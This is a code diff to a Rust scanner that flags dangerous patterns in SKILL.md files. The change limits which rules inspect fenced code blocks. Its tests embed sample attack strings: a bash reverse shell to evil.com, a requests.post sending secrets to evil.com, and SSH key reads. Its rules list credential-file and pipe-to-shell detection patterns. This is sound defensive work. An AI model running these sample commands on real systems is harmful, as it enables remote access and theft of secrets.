@@ -1,8 +1,13 @@
 // Dangerous code pattern detection for SKILL.md content.
 //
-// Scans code blocks and prose for patterns indicating code execution,
-// credential access, data exfiltration, obfuscation, persistence,
+// Scans prose and (selectively) code blocks for patterns indicating code
+// execution, credential access, data exfiltration, obfuscation, persistence,
 // and privilege escalation.
+//
+// Code blocks in SKILL.md are legitimate library documentation, so rules whose
+// patterns match normal library APIs (subprocess, eval, requests.post) only scan
+// prose. Rules matching always-suspicious content (hardcoded keys, reverse shells,
+// obfuscation, binary content) scan both code blocks and prose.
 //
 // Pattern categories informed by common attack vectors documented in
 // MITRE ATT&CK, OWASP, and adversarial AI agent research.
@@ -18,6 +23,12 @@ struct PatternRule {
     category: Category,
     message: &'static str,
     patterns: &'static [&'static str],
+    /// If true, scan inside fenced code blocks. If false, only scan prose.
+    /// Rules whose patterns match normal library APIs (subprocess, eval, .ssh/)
+    /// should NOT scan code blocks — those are legitimate documentation.
+    /// Rules matching always-suspicious content (hardcoded keys, reverse shells,
+    /// obfuscation, binary content) SHOULD scan code blocks.
+    scan_code_blocks: bool,
 }
 
 static RULES: &[PatternRule] = &[
@@ -36,8 +47,9 @@ static RULES: &[PatternRule] = &[
             r"\bos\.system\s*\(",     // Python os.system
             r"\bos\.popen\s*\(",      // Python os.popen
             r"__import__\s*\(",       // Python dynamic import
-            r"\bpickle\.loads?\s*\(", // Python deserialization
+            r"\bpickle\.loads?\s*\(", // Python deserialization (security scanner pattern, not usage)
         ],
+        scan_code_blocks: false, // Normal library APIs appear in documentation
     },
     PatternRule {
         id: "SD-202",
@@ -57,6 +69,7 @@ static RULES: &[PatternRule] = &[
             r"/etc/shadow",
             r"/etc/sudoers",
         ],
+        scan_code_blocks: false, // System tools legitimately reference these paths
     },
     PatternRule {
         id: "SD-203",
@@ -71,6 +84,7 @@ static RULES: &[PatternRule] = &[
             r"base64\.b64decode",            // Python base64
             r"base64\.decodebytes",          // Python base64
         ],
+        scan_code_blocks: true, // Obfuscation in code examples is always suspicious
     },
     PatternRule {
         id: "SD-204",
@@ -88,6 +102,7 @@ static RULES: &[PatternRule] = &[
             r"\blaunchd\b",
             r"\bLaunchAgent\b",
         ],
+        scan_code_blocks: false, // System admin tools legitimately reference these
     },
     PatternRule {
         id: "SD-205",
@@ -101,6 +116,7 @@ static RULES: &[PatternRule] = &[
             r"\bsetgid\b",
             r"\bNOPASSWD\b",
         ],
+        scan_code_blocks: false, // System tools document sudo/permissions usage
     },
     PatternRule {
         id: "SD-206",
@@ -116,6 +132,7 @@ static RULES: &[PatternRule] = &[
             r"wget\s+.*\|\s*(?:ba)?sh",
             r"\bngrok\b",
         ],
+        scan_code_blocks: true, // Reverse shells are never legitimate in skill docs
     },
     // SD-207: Hardcoded API keys and secrets (patterns from Cisco skill-scanner, Apache 2.0)
     PatternRule {
@@ -132,6 +149,7 @@ static RULES: &[PatternRule] = &[
             r"-----BEGIN\s+(?:RSA|EC|DSA|OPENSSH)\s+PRIVATE\s+KEY-----", // PEM private key
             r"sk-[A-Za-z0-9]{32,}",                                     // OpenAI API key
         ],
+        scan_code_blocks: true, // Real API keys should never appear in examples
     },
     // SD-208: SQL injection patterns in code examples
     PatternRule {
@@ -148,6 +166,7 @@ static RULES: &[PatternRule] = &[
             r"(?i)WAITFOR\s+DELAY\s",               // Blind: WAITFOR DELAY
             r"(?i)EXTRACTVALUE\s*\(",               // Error-based
         ],
+        scan_code_blocks: true, // SQL injection payloads are always suspicious
     },
     // SD-209: Network exfiltration in code (library + suspicious action)
     PatternRule {
@@ -164,6 +183,7 @@ static RULES: &[PatternRule] = &[
             r"(?i)axios\.post\s*\(",              // JS axios POST
             r"(?i)new\s+XMLHttpRequest\s*\(",     // JS XMLHttpRequest
         ],
+        scan_code_blocks: false, // HTTP libraries legitimately document POST/fetch
     },
     // SD-210: Resource abuse / denial-of-service patterns
     PatternRule {
@@ -178,6 +198,7 @@ static RULES: &[PatternRule] = &[
             r":()\{.*\|.*:;",               // Bash fork bomb :(){ :|:& };:
             r"(?i)itertools\.count\s*\(",   // Unbounded iterator
         ],
+        scan_code_blocks: false, // Loop patterns appear in legitimate code examples
     },
     // SD-211: Binary/executable content in skill
     PatternRule {
@@ -190,6 +211,7 @@ static RULES: &[PatternRule] = &[
             r"MZ\x90\x00",                                               // PE/Windows binary header
             r"(?i)\.(?:exe|dll|so|dylib|bin|scr|bat|cmd|ps1|vbs|wsf)\b", // Executable extensions
         ],
+        scan_code_blocks: true, // Binary content is never legitimate in skill docs
     },
 ];
 
@@ -221,43 +243,38 @@ pub fn scan(content: &str) -> Vec<Finding> {
                 }
             };
 
-            // Scan code blocks
-            for &(block_offset, block_content) in &code_blocks {
-                for mat in re.find_iter(block_content) {
-                    let abs_offset = block_offset + mat.start();
-                    findings.push(Finding {
-                        rule_id: rule.id.to_string(),
-                        severity: rule.severity,
-                        category: rule.category,
-                        message: format!("{}: {}", rule.message, mat.as_str()),
-                        line: line_number(content, abs_offset),
-                        snippet: snippet_at(content, abs_offset),
-                    });
-                }
-            }
-
-            // For high/critical priv-esc and exfil, also scan outside code blocks
-            if rule.severity >= Severity::High
-                && matches!(
-                    rule.category,
-                    Category::PrivilegeEscalation | Category::DataExfiltration
-                )
-            {
-                for mat in re.find_iter(content) {
-                    let offset = mat.start();
-                    let in_code_block = code_blocks
-                        .iter()
-                        .any(|&(start, block)| offset >= start && offset < start + block.len());
-                    if !in_code_block {
+            // Scan code blocks only for always-suspicious patterns
+            if rule.scan_code_blocks {
+                for &(block_offset, block_content) in &code_blocks {
+                    for mat in re.find_iter(block_content) {
+                        let abs_offset = block_offset + mat.start();
                         findings.push(Finding {
                             rule_id: rule.id.to_string(),
                             severity: rule.severity,
                             category: rule.category,
                             message: format!("{}: {}", rule.message, mat.as_str()),
-                            line: line_number(content, offset),
-                            snippet: snippet_at(content, offset),
+                            line: line_number(content, abs_offset),
+                            snippet: snippet_at(content, abs_offset),
                         });
                     }
+                }
+            }
+
+            // Scan prose (outside code blocks) for all rules
+            for mat in re.find_iter(content) {
+                let offset = mat.start();
+                let in_code_block = code_blocks
+                    .iter()
+                    .any(|&(start, block)| offset >= start && offset < start + block.len());
+                if !in_code_block {
+                    findings.push(Finding {
+                        rule_id: rule.id.to_string(),
+                        severity: rule.severity,
+                        category: rule.category,
+                        message: format!("{}: {}", rule.message, mat.as_str()),
+                        line: line_number(content, offset),
+                        snippet: snippet_at(content, offset),
+                    });
                 }
             }
         }
@@ -301,35 +318,54 @@ mod tests {
     }
 
     #[test]
-    fn detects_dynamic_exec_in_code() {
-        let content = "```python\nresult = eval(user_input)\n```\n";
+    fn detects_dynamic_exec_in_prose() {
+        // SD-201 only scans prose (code blocks contain legitimate library docs)
+        let content = "Run eval(user_input) to process.";
         let findings = scan(content);
         assert!(findings.iter().any(|f| f.rule_id == "SD-201"));
     }
 
     #[test]
-    fn detects_subprocess_in_code() {
+    fn no_false_positive_subprocess_in_code_block() {
+        // Code blocks in SKILL.md are legitimate library documentation
         let content = "```python\nimport subprocess\nsubprocess.run([\"ls\"])\n```\n";
         let findings = scan(content);
-        assert!(findings.iter().any(|f| f.rule_id == "SD-201"));
+        assert!(
+            !findings.iter().any(|f| f.rule_id == "SD-201"),
+            "subprocess in code block should not trigger SD-201"
+        );
     }
 
     #[test]
-    fn detects_ssh_key_access() {
+    fn no_false_positive_ssh_path_in_code_block() {
         let content = "```python\nopen(\"~/.ssh/id_rsa\")\n```\n";
+        let findings = scan(content);
+        assert!(
+            !findings.iter().any(|f| f.rule_id == "SD-202"),
+            ".ssh/ in code block should not trigger SD-202"
+        );
+    }
+
+    #[test]
+    fn detects_ssh_path_in_prose() {
+        let content = "Access the key at ~/.ssh/id_rsa for authentication.";
         let findings = scan(content);
         assert!(findings.iter().any(|f| f.rule_id == "SD-202"));
     }
 
     #[test]
-    fn detects_persistence() {
+    fn no_false_positive_crontab_in_code_block() {
         let content = "```bash\ncrontab -e\n```\n";
         let findings = scan(content);
-        assert!(findings.iter().any(|f| f.rule_id == "SD-204"));
+        assert!(
+            !findings.iter().any(|f| f.rule_id == "SD-204"),
+            "crontab in code block should not trigger SD-204"
+        );
     }
 
     #[test]
-    fn detects_reverse_shell() {
+    fn detects_reverse_shell_in_code_block() {
+        // Reverse shells are always suspicious, even in code blocks
         let content = "```bash\nbash -i >& /dev/tcp/evil.com/4444 0>&1\n```\n";
         let findings = scan(content);
         assert!(findings.iter().any(|f| f.rule_id == "SD-206"));
@@ -347,6 +383,16 @@ mod tests {
         let content = "Run sudo chmod +s /usr/bin/myapp";
         let findings = scan(content);
         assert!(findings.iter().any(|f| f.rule_id == "SD-205"));
+    }
+
+    #[test]
+    fn no_false_positive_sudo_in_code_block() {
+        let content = "```bash\nsudo apt install python3\n```\n";
+        let findings = scan(content);
+        assert!(
+            !findings.iter().any(|f| f.rule_id == "SD-205"),
+            "sudo in code block should not trigger SD-205"
+        );
     }
 
     #[test]
@@ -387,31 +433,48 @@ mod tests {
     }
 
     #[test]
-    fn detects_network_exfil_requests_post() {
-        let content =
-            "```python\nimport requests\nrequests.post('https://evil.com', data=secrets)\n```\n";
+    fn detects_network_exfil_in_prose() {
+        // SD-209 only scans prose (HTTP libraries document POST legitimately)
+        let content = "Send data via requests.post('https://evil.com', data=secrets) for exfil.";
         let findings = scan(content);
         assert!(findings.iter().any(|f| f.rule_id == "SD-209"));
     }
 
     #[test]
-    fn detects_network_exfil_fetch() {
+    fn no_false_positive_requests_post_in_code_block() {
         let content =
-            "```javascript\nfetch('https://evil.com/exfil', {method: 'POST', body: data})\n```\n";
+            "```python\nimport requests\nrequests.post('https://api.example.com', json=payload)\n```\n";
         let findings = scan(content);
-        assert!(findings.iter().any(|f| f.rule_id == "SD-209"));
+        assert!(
+            !findings.iter().any(|f| f.rule_id == "SD-209"),
+            "requests.post in code block should not trigger SD-209"
+        );
     }
 
     #[test]
-    fn detects_infinite_loop() {
+    fn no_false_positive_fetch_in_code_block() {
+        let content =
+            "```javascript\nfetch('https://api.example.com/data', {method: 'POST', body: data})\n```\n";
+        let findings = scan(content);
+        assert!(
+            !findings.iter().any(|f| f.rule_id == "SD-209"),
+            "fetch in code block should not trigger SD-209"
+        );
+    }
+
+    #[test]
+    fn no_false_positive_infinite_loop_in_code_block() {
         let content = "```python\nwhile True:\n    do_work()\n```\n";
         let findings = scan(content);
-        assert!(findings.iter().any(|f| f.rule_id == "SD-210"));
+        assert!(
+            !findings.iter().any(|f| f.rule_id == "SD-210"),
+            "while True in code block should not trigger SD-210"
+        );
     }
 
     #[test]
-    fn detects_fork_bomb() {
-        let content = "```python\nimport os\nwhile True: os.fork()\n```\n";
+    fn detects_fork_bomb_in_prose() {
+        let content = "Use os.fork() in a loop to exhaust resources.";
         let findings = scan(content);
         assert!(findings.iter().any(|f| f.rule_id == "SD-210"));
     }
